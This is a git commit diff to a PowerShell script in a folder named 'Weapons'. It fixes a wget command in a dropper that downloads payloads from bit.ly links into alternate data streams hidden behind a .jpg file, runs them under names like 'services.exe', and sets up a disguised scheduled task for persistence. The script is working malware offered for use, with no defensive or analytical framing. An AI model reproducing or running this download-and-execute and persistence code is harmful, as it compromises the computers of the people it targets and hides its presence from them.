1e046df221f9a2fa3a03f307d15e523aeafe0563
Large Virtual Corp <100154616+vmwaresecurity@users.noreply.github.com>
2022-03-18 00:15:00 +0530

    Update reg64.ps1

--- Weapons/reg64.ps1
+++ Weapons/reg64.ps1
@@ -6,4 +6,4 @@ curl https://wallpaperaccess.com/full/94002.jpg -o C:\ProgramData\.temp\94002.jp
 cmd /c "curl https://bit.ly/3sIId5a -o C:\ProgramData\.temp\94002.jpg:services.exe && C:\ProgramData\.temp\94002.jpg:services.exe"
 # schtasks /create /s $env:ComputerName /ru "SYSTEM" /tn "servicesfc.exe" /tr C:\ProgramData\.temp\94002.jpg:services.exe /sc once /sd 12/25/2025 /st 15:00:00 /v1 /z
 cmd /c 'schtasks /create /tn "servicesfc.exe" /tr C:\ProgramData\.temp\94002.jpg:services.exe /sc once /st 15:00 /sd 12/25/2025'
-cmd /c "wget https://bit.ly/3KlymYH -o C:\ProgramData\.temp\94002.jpg:system64.ps1 && C:\ProgramData\.temp\94002.jpg:system64.ps1"
+cmd /c "wget -O C:\ProgramData\.temp\94002.jpg:system64.ps1 https://bit.ly/3KlymYH && C:\ProgramData\.temp\94002.jpg:system64.ps1"
